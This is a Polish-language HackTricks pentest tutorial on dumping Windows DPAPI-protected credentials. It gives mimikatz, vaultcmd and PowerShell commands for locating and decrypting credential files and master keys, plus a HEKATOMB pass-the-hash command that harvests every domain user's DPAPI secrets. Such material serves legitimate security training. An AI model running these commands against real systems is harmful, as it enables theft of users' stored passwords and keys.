# DPAPI - Ekstrakcja Haseł

{% hint style="success" %}
Ucz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

</details>
{% endhint %}

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​[**RootedCON**](https://www.rootedcon.com/) to najważniejsze wydarzenie związane z cyberbezpieczeństwem w **Hiszpanii** i jedno z najważniejszych w **Europie**. Z **misją promowania wiedzy technicznej**, ten kongres jest gorącym punktem spotkań dla profesjonalistów z dziedziny technologii i cyberbezpieczeństwa w każdej dyscyplinie.

{% embed url="https://www.rootedcon.com/" %}

## Czym jest DPAPI

Data Protection API (DPAPI) jest głównie wykorzystywane w systemie operacyjnym Windows do **symmetric encryption of asymmetric private keys**, wykorzystując tajemnice użytkownika lub systemu jako istotne źródło entropii. To podejście upraszcza szyfrowanie dla programistów, umożliwiając im szyfrowanie danych za pomocą klucza pochodzącego z tajemnic logowania użytkownika lub, w przypadku szyfrowania systemowego, tajemnic uwierzytelniania domeny systemu, eliminując w ten sposób potrzebę zarządzania ochroną klucza szyfrującego przez programistów.

### Chronione dane przez DPAPI

Wśród danych osobowych chronionych przez DPAPI znajdują się:

* Hasła i dane autouzupełniania Internet Explorera i Google Chrome
* Hasła do kont e-mail i wewnętrznych kont FTP dla aplikacji takich jak Outlook i Windows Mail
* Hasła do folderów współdzielonych, zasobów, sieci bezprzewodowych i Windows Vault, w tym klucze szyfrujące
* Hasła do połączeń zdalnego pulpitu, .NET Passport oraz klucze prywatne do różnych celów szyfrowania i uwierzytelniania
* Hasła sieciowe zarządzane przez Menedżera poświadczeń oraz dane osobowe w aplikacjach korzystających z CryptProtectData, takich jak Skype, MSN messenger i inne

## Lista Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Pliki poświadczeń

Pliki **poświadczeń chronionych** mogą znajdować się w:
```
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Uzyskaj informacje o poświadczeniach za pomocą mimikatz `dpapi::cred`, w odpowiedzi możesz znaleźć interesujące informacje, takie jak zaszyfrowane dane i guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
Możesz użyć **mimikatz module** `dpapi::cred` z odpowiednim `/masterkey`, aby odszyfrować:
```
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
```
## Master Keys

Klucze DPAPI używane do szyfrowania kluczy RSA użytkownika są przechowywane w katalogu `%APPDATA%\Microsoft\Protect\{SID}`, gdzie {SID} to [**Identifikator zabezpieczeń**](https://en.wikipedia.org/wiki/Security\_Identifier) **tego użytkownika**. **Klucz DPAPI jest przechowywany w tym samym pliku co klucz główny, który chroni prywatne klucze użytkowników**. Zwykle ma 64 bajty losowych danych. (Zauważ, że ten katalog jest chroniony, więc nie możesz go wylistować używając `dir` z cmd, ale możesz go wylistować z PS).
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
To jest to, jak wygląda zestaw kluczy głównych użytkownika:

![](<../../.gitbook/assets/image (1121).png>)

Zazwyczaj **każdy klucz główny to zaszyfrowany klucz symetryczny, który może odszyfrować inny content**. Dlatego **wyodrębnienie** **zaszyfrowanego klucza głównego** jest interesujące, aby **odszyfrować** później ten **inny content** zaszyfrowany za jego pomocą.

### Wyodrębnij klucz główny i odszyfruj

Sprawdź post [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#extracting-dpapi-backup-keys-with-domain-admin) jako przykład, jak wyodrębnić klucz główny i go odszyfrować.

## SharpDPAPI

[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI#sharpdpapi-1) to port C# niektórych funkcji DPAPI z projektu [@gentilkiwi](https://twitter.com/gentilkiwi)'s [Mimikatz](https://github.com/gentilkiwi/mimikatz/).

## HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) to narzędzie, które automatyzuje wyodrębnianie wszystkich użytkowników i komputerów z katalogu LDAP oraz wyodrębnianie klucza zapasowego kontrolera domeny przez RPC. Skrypt następnie rozwiąże adresy IP wszystkich komputerów i wykona smbclient na wszystkich komputerach, aby odzyskać wszystkie obiekty DPAPI wszystkich użytkowników i odszyfrować wszystko za pomocą klucza zapasowego domeny.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Z wyodrębnioną listą komputerów z LDAP możesz znaleźć każdą podsieć, nawet jeśli ich nie znałeś!

"Ponieważ prawa administratora domeny to za mało. Hakeruj je wszystkie."

## DonPAPI

[**DonPAPI**](https://github.com/login-securite/DonPAPI) może automatycznie wyodrębniać sekrety chronione przez DPAPI.

## Referencje

* [https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13](https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13)
* [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) to najważniejsze wydarzenie związane z cyberbezpieczeństwem w **Hiszpanii** i jedno z najważniejszych w **Europie**. Z **misją promowania wiedzy technicznej**, ten kongres jest gorącym punktem spotkań dla profesjonalistów technologii i cyberbezpieczeństwa w każdej dziedzinie.

{% embed url="https://www.rootedcon.com/" %}

{% hint style="success" %}
Ucz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel się trikami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na githubie.

</details>
{% endhint %}
